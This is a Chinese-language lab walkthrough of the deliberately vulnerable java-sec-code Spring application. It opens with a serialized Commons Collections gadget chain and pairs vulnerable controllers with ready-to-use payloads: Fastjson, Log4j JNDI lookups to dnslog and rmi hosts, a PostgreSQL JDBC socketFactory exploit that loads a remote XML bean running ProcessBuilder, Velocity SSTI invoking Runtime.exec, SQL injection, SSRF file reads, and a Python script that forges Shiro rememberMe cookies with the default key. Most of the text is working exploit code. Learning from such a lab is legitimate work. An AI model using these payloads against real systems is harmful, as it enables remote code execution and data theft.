173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4 之后在 cookie 中加入payload：\n注意： rememberMe = \u0026lt;payload\u0026gt;\n发包后会弹出计算器\nFastjson 触发点: JSON.parseObject() JSON.parse()\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Controller @RequestMapping(\u0026#34;/fastjson\u0026#34;) public class Fastjson { @RequestMapping(value = \u0026#34;/deserialize\u0026#34;, method = {RequestMethod.POST}) @ResponseBody public String Deserialize(@RequestBody String params) { // 如果Content-Type不设置application/json格式，post数据会被url编码 try { // 将post提交的string转换为json //Fastjson 框架将字符串解析为 JSONObject 对象 JSONObject ob = JSON.parseObject(params); return ob.get(\u0026#34;name\u0026#34;).toString(); } catch (Exception e) { return e.toString(); } } 漏洞利用：\npost 请求 /fastjson/deserialize ，传输 application/json 格式数据\npayload:\ntext\r1 {\u0026#34;name\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;2jf0vy.dnslog.cn\u0026#34;}} FileUpload java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 @Controller @RequestMapping(\u0026#34;/file\u0026#34;) public class FileUpload { // Save the uploaded file to this folder private static final String UPLOADED_FOLDER = \u0026#34;/tmp/\u0026#34;; private final Logger logger = LoggerFactory.getLogger(this.getClass()); private static String randomFilePath = \u0026#34;\u0026#34;; // uplaod any file @GetMapping(\u0026#34;/any\u0026#34;) public String index() { return \u0026#34;upload\u0026#34;; // return upload.html page } // only allow to upload pictures @GetMapping(\u0026#34;/pic\u0026#34;) public String uploadPic() { return \u0026#34;uploadPic\u0026#34;; // return uploadPic.html page } @PostMapping(\u0026#34;/upload\u0026#34;) public String singleFileUpload(@RequestParam(\u0026#34;file\u0026#34;) MultipartFile file, RedirectAttributes redirectAttributes) { if (file.isEmpty()) { // 赋值给uploadStatus.html里的动态参数message redirectAttributes.addFlashAttribute(\u0026#34;message\u0026#34;, \u0026#34;Please select a file to upload\u0026#34;); return \u0026#34;redirect:/file/status\u0026#34;; } try { // Get the file and save it somewhere byte[] bytes = file.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename()); Files.write(path, bytes); redirectAttributes.addFlashAttribute(\u0026#34;message\u0026#34;, \u0026#34;You successfully uploaded \u0026#39;\u0026#34; + UPLOADED_FOLDER + file.getOriginalFilename() + \u0026#34;\u0026#39;\u0026#34;); } catch (IOException e) { redirectAttributes.addFlashAttribute(\u0026#34;message\u0026#34;, \u0026#34;upload failed\u0026#34;); logger.error(e.toString()); } return \u0026#34;redirect:/file/status\u0026#34;; } 未对文件名、后缀名进行过滤，直接上传文件。\n漏洞利用：\n功能点：http://127.0.0.1:8081/file/any ，可以上传任意文件\nGetRequestURI request.getRequestURL() 返回全路径\nrequest.getRequestURI() 返回除去host（域名或者ip）部分的路径\nrequest.getContextPath() 返回工程名部分，如果工程映射为/，此处返回则为空\nrequest.getServletPath() 返回除去host和工程名部分的路径\n例如：\nrequest.getRequestURL() http://localhost:8080/jqueryLearn/resources/request.jsp request.getRequestURI() /jqueryLearn/resources/request.jsp request.getContextPath()/jqueryLearn request.getServletPath()/resources/request.jsp\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 @RestController @RequestMapping(\u0026#34;uri\u0026#34;) public class GetRequestURI { private final Logger logger = LoggerFactory.getLogger(this.getClass()); @GetMapping(value = \u0026#34;/exclued/vuln\u0026#34;) //方法接收 HttpServletRequest 用于获取当前请求的 URI、路径等信息 public String exclued(HttpServletRequest request) { //若请求路径匹配 /css/** 和 /js/** 路径，就跳过登录 String[] excluedPath = {\u0026#34;/css/**\u0026#34;, \u0026#34;/js/**\u0026#34;}; //获取请求 URI String uri = request.getRequestURI(); // Security: request.getServletPath() PathMatcher matcher = new AntPathMatcher(); //打印 getRequestURI() 和 getServletPath() 的结果 logger.info(\u0026#34;getRequestURI: \u0026#34; + uri); logger.info(\u0026#34;getServletPath: \u0026#34; + request.getServletPath()); //遍历所有排除规则，如果当前请求 URI 匹配任意规则，则认为绕过登录校验 for (String path : excluedPath) { if (matcher.match(path, uri)) { return \u0026#34;You have bypassed the login page.\u0026#34;; } } //如果请求路径不匹配排除规则，则返回提示页面是登录页。 return \u0026#34;This is a login page \u0026gt;..\u0026lt;\u0026#34;; } } 这里有一个奇怪的点：@RequestMapping(\u0026quot;uri\u0026quot;)\n注释中都没有加 uri ，如果不加 uri 下面的全部访问不到，但是 getRequestURI() 返回除去 host（域名或者ip）部分的路径 一定会包含 uri ，这就导致 String[] excluedPath = {\u0026quot;/css/**\u0026quot;, \u0026quot;/js/**\u0026quot;}; 完全起不到作用，因为 getRequestURI() 返回为 /uri/...，导致匹配不到 \u0026quot;/css/**\u0026quot;, \u0026quot;/js/**\u0026quot;\n测试：\nJava\r1 2 3 4 5 6 7 @GetMapping(\u0026#34;/testPath\u0026#34;) public String testPath(HttpServletRequest request) { // 返回当前请求的完整路径 和 servletPath String uri = request.getRequestURI(); String servletPath = request.getServletPath(); return \u0026#34;getRequestURI: \u0026#34; + uri + \u0026#34;\\ngetServletPath: \u0026#34; + servletPath; } 想要利用就改一下匹配规则：\ntext\r1 String[] excluedPath = {\u0026#34;/uri/css/**\u0026#34;, \u0026#34;/uri/js/**\u0026#34;}; text\r1 2 3 poc: /uri/css/..;/exclued/vuln /uri/css/..;bypasswaf/exclued/vuln jdbc-CVE 2022 21724 Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Slf4j @RestController @RequestMapping(\u0026#34;/jdbc\u0026#34;) public class Jdbc { /** * \u0026lt;a href=\u0026#34;https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-21724\u0026#34;\u0026gt;CVE-2022-21724\u0026lt;/a\u0026gt; */ @RequestMapping(\u0026#34;/postgresql\u0026#34;) //接收 Base64 编码的 jdbcurl ， public void postgresql(String jdbcUrlBase64) throws Exception{ byte[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64); String jdbcUrl = new String(b); log.info(jdbcUrl); DriverManager.getConnection(jdbcUrl); } @RequestMapping(\u0026#34;/db2\u0026#34;) public void db2(String jdbcUrlBase64) throws Exception{ Class.forName(\u0026#34;com.ibm.db2.jcc.DB2Driver\u0026#34;); byte[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64); String jdbcUrl = new String(b); log.info(jdbcUrl); DriverManager.getConnection(jdbcUrl); } } PostgreSQL JDBC 驱动支持通过 JDBC URL 中的参数 socketFactory 指定自定义类，用于创建 socket 连接。\n在漏洞版本中，这个类没有限制来源，攻击者可通过如下 URL 参数让其加载任意类：\ntext\r1 socketFactory=\u0026lt;任意类\u0026gt;\u0026amp;socketFactoryArg=\u0026lt;任意参数\u0026gt; Spring 环境中存在的 org.springframework.context.support.ClassPathXmlApplicationContext 是一个典型的入口点，它可自动解析并执行外部 XML 配置。\npayload：\ntext\r1 2 3 jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA== jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext\u0026amp;socketFactoryArg=http://test.joychou.org/1.xml socketFactory = 使用了 Spring 的 ClassPathXmlApplicationContext 类\n该类在初始化时会加载并解析指定 URL 或文件的 Spring XML 配置。 socketFactoryArg = 远程的 1.xml\n这个 XML 是 Spring Bean 配置文件，包含了一个 ProcessBuilder Bean，启动本地程序。 1.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:p=\u0026#34;http://www.springframework.org/schema/p\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;exec\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;open\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;-a\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;calculator\u0026lt;/value\u0026gt;\u0026lt;!-- mac 中运行计算机；Linux 就是 /bin/sh，Windows 就是 cmd.exe--\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; jsonp JSONP（JSON with Padding）是浏览器早期为了解决跨域请求数据的一种方法。它的基本原理是：\ntext\r1 \u0026lt;script src=\u0026#34;http://example.com/jsonp?callback=handleResponse\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 服务器返回的不是 JSON，而是：\ntext\r1 handleResponse({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}); 如果服务器不严格校验 callback 参数来源，就可能造成 跨站数据泄露（XSS） 或 信息泄露漏洞。\n漏洞利用：\n搜关键字：AbstractJsonpResponseBodyAdvice\njava\r1 2 3 4 5 6 7 8 9 10 11 @ControllerAdvice public class Object2Jsonp extends AbstractJsonpResponseBodyAdvice { private final String[] callbacks; private final Logger logger= LoggerFactory.getLogger(this.getClass()); // method of using @Value in constructor public Object2Jsonp(@Value(\u0026#34;${joychou.security.jsonp.callback}\u0026#34;) String[] callbacks) { super(callbacks); // Can set multiple paramNames this.callbacks = callbac Log4j 版本存在漏洞\njava\r1 2 3 4 5 6 7 @RequestMapping(value = \u0026#34;/log4j\u0026#34;) //使用 logger.error(token) 将用户输入写入日志。如果 Log4j 使用的是受影响版本，这里的 ${jndi:ldap://...} 将被解析执行，触发远程加载类，导致 RCE public String log4j(String token) { logger.error(token); return token; } POC1:\n/log4j?token=${jndi:ldap://${env:OS}.44wodg.dnslog.cn}\n直接访问会对非法字符过滤，需要 url 编码后注入\n/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Benv%3AOS%7D.44wodg.dnslog.cn%7D\nPOC2:\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026quot;calc\u0026quot;\nrmi://169.254.39.1:1099/ihe2v1\n${jndi:rmi://169.254.39.1:1099/ihe2v1}\n/log4j?token=${jndi:rmi://169.254.39.1:1099/ihe2v1}\nurl 编码：/log4j?token=%24%7Bjndi%3Armi%3A%2F%2F169.254.39.1%3A1099%2Fihe2v1%7D\nPathTraversal 没有对文件路径做任何过滤，攻击者可以访问任意文件\nSQLI 1./jdbc/vuln 注入点：\nJava\r1 2 3 4 5 6 @RequestMapping(\u0026#34;/jdbc/vuln\u0026#34;) public String jdbc_sqli_vul(@RequestParam(\u0026#34;username\u0026#34;) String username) { ... String sql = \u0026#34;select * from users where username = \u0026#39;\u0026#34; + username + \u0026#34;\u0026#39;\u0026#34;; ... } url:\ntext\r1 http://127.0.0.1:8081/sqli/jdbc/vuln?username=joychou\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 2./jdbc/sec java\r1 2 3 4 5 6 @RequestMapping(\u0026#34;/jdbc/sec\u0026#34;) public String jdbc_sqli_sec(@RequestParam(\u0026#34;username\u0026#34;) String username) { ... String sql = \u0026#34;select * from users where username = ?\u0026#34;; ... } 采用预编译，自动进行了转义，安全\n3./jdbc/ps/vuln PreparedStatement 是 Java JDBC 提供的 预编译 SQL 语句执行器，用于安全执行 SQL 查询，防止 SQL 注入。\nPreparedStatement 是 java.sql 包中的一个接口，继承自 Statement。与普通的 Statement 相比，它可以使用 ? 占位符来动态绑定参数，而不是直接拼接 SQL 字符串。\njava\r1 2 3 4 5 6 7 @RequestMapping(\u0026#34;/jdbc/ps/vuln\u0026#34;) public String jdbc_ps_vuln(@RequestParam(\u0026#34;username\u0026#34;) String username) { ... String sql = \u0026#34;select * from users where username = \u0026#39;\u0026#34; + username + \u0026#34;\u0026#39;\u0026#34;; PreparedStatement st = con.prepareStatement(sql); ... }\t错误使用 PreparedStatement , 虽然用的是 PreparedStatement，但 SQL 已拼接完成，还是有注入风险。\njava\r1 2 3 4 // 正确使用范式 String sql = \u0026#34;SELECT * FROM users WHERE username = ?\u0026#34;; PreparedStatement st = con.prepareStatement(sql); st.setString(1, username); // 参数绑定 url:\ntext\r1 http://127.0.0.1:8081/sqli/jdbc/ps/vuln?username=joychou\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 4./mybatis/vuln01 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/vuln01\u0026#34;) public List\u0026lt;User\u0026gt; mybatisVuln01(@RequestParam(\u0026#34;username\u0026#34;) String username) { return userMapper.findByUserNameVuln01(username); } java\r1 2 @Select(\u0026#34;select * from users where username = \u0026#39;${username}\u0026#39;\u0026#34;) List\u0026lt;User\u0026gt; findByUserNameVuln01(@Param(\u0026#34;username\u0026#34;) String username); text\r1 /sqli/mybatis/vuln01?username=admin\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 返回数据库中所有用户\n5./mybatis/vuln02 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/vuln02\u0026#34;) public List\u0026lt;User\u0026gt; mybatisVuln02(@RequestParam(\u0026#34;username\u0026#34;) String username) { return userMapper.findByUserNameVuln02(username); } java\r1 List\u0026lt;User\u0026gt; findByUserNameVuln02(String username); xml\r1 2 3 \u0026lt;select id=\u0026#34;findByUserNameVuln02\u0026#34; parameterType=\u0026#34;String\u0026#34; resultMap=\u0026#34;User\u0026#34;\u0026gt; select * from users where username like \u0026#39;%${_parameter}%\u0026#39; \u0026lt;/select\u0026gt; XML 配置中拼接 like + ${}\ntext\r1 2 /sqli/mybatis/vuln02?username=\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 -\u0026gt;select * from users where username like \u0026#39;%\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1%\u0026#39; 6./mybatis/orderby/vuln03 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/orderby/vuln03\u0026#34;) public List\u0026lt;User\u0026gt; mybatisVuln03(@RequestParam(\u0026#34;sort\u0026#34;) String sort) { return userMapper.findByUserNameVuln03(sort); } java\r1 List\u0026lt;User\u0026gt; findByUserNameVuln03(@Param(\u0026#34;order\u0026#34;) String order); xml\r1 2 3 4 5 6 \u0026lt;select id=\u0026#34;findByUserNameVuln03\u0026#34; parameterType=\u0026#34;String\u0026#34; resultMap=\u0026#34;User\u0026#34;\u0026gt; select * from users \u0026lt;if test=\u0026#34;order != null\u0026#34;\u0026gt; order by ${order} asc \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; ORDER BY 拼接排序字段\ntext\r1 2 /sqli/mybatis/orderby/vuln03?sort=id desc--+ -\u0026gt;select * from users order by id desc--+ asc 7./mybatis/sec01 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/sec01\u0026#34;) public User mybatisSec01(@RequestParam(\u0026#34;username\u0026#34;) String username) { return userMapper.findByUserName(username); } java\r1 2 @Select(\u0026#34;select * from users where username = #{username}\u0026#34;) User findByUserName(@Param(\u0026#34;username\u0026#34;) String username); 8./mybatis/sec02 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/sec02\u0026#34;) public User mybatisSec02(@RequestParam(\u0026#34;id\u0026#34;) Integer id) { return userMapper.findById(id); } java\r1 User findById(Integer id); xml\r1 2 3 \u0026lt;select id=\u0026#34;findById\u0026#34; resultMap=\u0026#34;User\u0026#34;\u0026gt; select * from users where id = #{id} \u0026lt;/select\u0026gt; 9./mybatis/sec03 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/sec03\u0026#34;) public User mybatisSec03() { return userMapper.OrderByUsername(); } java\r1 User OrderByUsername(); xml\r1 2 3 \u0026lt;select id=\u0026#34;OrderByUsername\u0026#34; resultMap=\u0026#34;User\u0026#34;\u0026gt; select * from users order by id asc limit 1 \u0026lt;/select\u0026gt; 10./mybatis/orderby/sec04 java\r1 2 3 4 @GetMapping(\u0026#34;/mybatis/orderby/sec04\u0026#34;) public List\u0026lt;User\u0026gt; mybatisOrderBySec04(@RequestParam(\u0026#34;sort\u0026#34;) String sort) { return userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort)); } java\r1 List\u0026lt;User\u0026gt; findByUserNameVuln03(@Param(\u0026#34;order\u0026#34;) String order); xml\r1 2 3 4 5 6 \u0026lt;select id=\u0026#34;findByUserNameVuln03\u0026#34; parameterType=\u0026#34;String\u0026#34; resultMap=\u0026#34;User\u0026#34;\u0026gt; select * from users \u0026lt;if test=\u0026#34;order != null\u0026#34;\u0026gt; order by ${order} asc \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; SSTI SSTI（Server-Side Template Injection）就是服务器端模板注入\nJava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 @GetMapping(\u0026#34;/velocity\u0026#34;) public void velocity(String template) { Velocity.init(); VelocityContext context = new VelocityContext(); context.put(\u0026#34;author\u0026#34;, \u0026#34;Elliot A.\u0026#34;); context.put(\u0026#34;address\u0026#34;, \u0026#34;217 E Broadway\u0026#34;); context.put(\u0026#34;phone\u0026#34;, \u0026#34;555-1337\u0026#34;); //对用户传入的 template 无过滤直接传入 Velocity.evaluate 执行， StringWriter swOut = new StringWriter(); Velocity.evaluate(context, swOut, \u0026#34;test\u0026#34;, template); } 漏洞利用：\ntext\r1 2 3 http://127.0.0.1:8081/ssti/velocity?template=#set($e=\u0026#34;e\u0026#34;);$e.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;,null).invoke(null,null).exec(\u0026#34;calc.exe\u0026#34;) http://127.0.0.1:8081/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22) #set($e=\u0026quot;e\u0026quot;) Velocity 模板语言中的变量定义。创建一个变量 $e，值为字符串 \u0026quot;e\u0026quot;。后面我们会用 $e.getClass() 来获取它的 Class 对象，从而进入 Java 反射\n$e.getClass() $e 是字符串 \u0026quot;e\u0026quot;，调用 .getClass() 得到的是：\ntext\r1 java.lang.String.class 得到了 Class\u0026lt;java.lang.String\u0026gt;，可以调用其 forName() 静态方法\n.forName(\u0026quot;java.lang.Runtime\u0026quot;) 通过反射加载 java.lang.Runtime 类：\ntext\r1 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) 返回 java.lang.Runtime.class，可以继续调用它的方法\n.getMethod(\u0026quot;getRuntime\u0026quot;, null) 获取 Runtime 类的静态方法 getRuntime()：\ntext\r1 Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;, null) getMethod() 返回一个 Method 对象，准备执行它\n.invoke(null, null) 执行静态方法 getRuntime()：\ntext\r1 Runtime.getRuntime() 得到了当前 JVM 的 Runtime 实例，具备执行命令的能力\n.exec(\u0026quot;calc.exe\u0026quot;) 最终执行命令：\ntext\r1 Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;) 在 Windows 上，打开计算器\nSSRF SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\njava\r1 2 3 4 @RequestMapping(value = \u0026#34;/urlConnection/vuln\u0026#34;, method = {RequestMethod.POST, RequestMethod.GET}) public String URLConnectionVuln(String url) { return HttpUtils.URLConnection(url); } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public static String URLConnection(String url) { try { //没有校验协议和主机，对任意协议都可以访问 URL u = new URL(url); URLConnection urlConnection = u.openConnection(); BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request String inputLine; StringBuilder html = new StringBuilder(); while ((inputLine = in.readLine()) != null) { html.append(inputLine); } in.close(); return html.toString(); } catch (Exception e) { logger.error(e.getMessage()); return e.getMessage(); } } text\r1 /ssrf/urlConnection/vuln?url=file:/D:/1.txt Shiro Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @GetMapping(value = \u0026#34;/shiro/deserialize\u0026#34;) public String shiro_deserialize(HttpServletRequest req, HttpServletResponse res) { Cookie cookie = getCookie(req, Constants.REMEMBER_ME_COOKIE); if (null == cookie) { return \u0026#34;No rememberMe cookie. Right?\u0026#34;; } try { String rememberMe = cookie.getValue(); byte[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe); byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes(); ByteArrayInputStream bytes = new ByteArrayInputStream(aesDecrypt); ObjectInputStream in = new ObjectInputStream(bytes); in.readObject(); in.close(); } catch (Exception e){ if (CookieUtils.addCookie(res, \u0026#34;rememberMe\u0026#34;, DELETE_ME)){ log.error(e.getMessage()); return \u0026#34;RememberMe cookie decrypt error. Set deleteMe cookie success.\u0026#34;; } } return \u0026#34;Shiro deserialize\u0026#34;; } Shiro rememberMe 功能用于“记住登录状态”。它的设计逻辑是：\n用户勾选“记住我”登录后，Shiro 把用户的认证信息序列化为字节流，用一个固定密钥（默认是 kPH+bIxk5D2deZiIxcaaaA==）用 AES 加密，Base64 编码后作为 rememberMe Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 rememberMe Cookie，用同样的密钥进行解密，然后直接反序列化出用户对象，只要攻击者能控制 rememberMe Cookie 内容，就能构造恶意对象反序列化，从而执行任意代码。\n漏洞利用：\n生成恶意序列化数据\ntext\r1 java -jar ysoserial.jar CommonsBeanutils1 \u0026#34;calc.exe\u0026#34; \u0026gt; payload.bin 加密 Payload\npython\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from Crypto.Cipher import AES import base64 # Shiro 默认密钥 key = base64.b64decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;) # 读取 payload with open(\u0026#34;D:\\\\CTF-Tools\\\\ysoserial-master\\\\target\\\\payload.bin\u0026#34;, \u0026#34;rb\u0026#34;) as f: payload = f.read() # 补齐为 16 的倍数 (PKCS5Padding) pad = 16 - len(payload) % 16 payload += bytes([pad] * pad) # AES-CBC 加密 (IV 随机生成) iv = b\u0026#39;\\x00\u0026#39; * 16 # 实际攻击需随机 IV cipher = AES.new(key, AES.MODE_CBC, iv) encrypted = cipher.encrypt(payload) # Base64 编码 rememberMe = base64.b64encode(iv + encrypted).decode() # Shiro 格式: IV+密文 print(\u0026#34;恶意 Cookie:\u0026#34;, rememberMe) text\r1 2 恶意 Cookie: AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/gdRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+2UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/gcYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+7imK4pCFGgBIqX+1G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw/W0VgEmjpG2OsLRtsCRddr8/Vky+6t5i76oEqDU8iPh/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/zvbXM/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/vO+kPojn/GA+H38ovGW6reqxHXooV655jmV155px5BFR/MvklhgGyiSPVNoPL567alnOsfhd2R2h3/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR/+RZR9Pdu65/KYqX85Fw1knJYNJF3wKT/uI8deF+D0b/Ib0rzkHWI2nFWQ24T+Zl1/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/AgzKBPup2b+3V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0K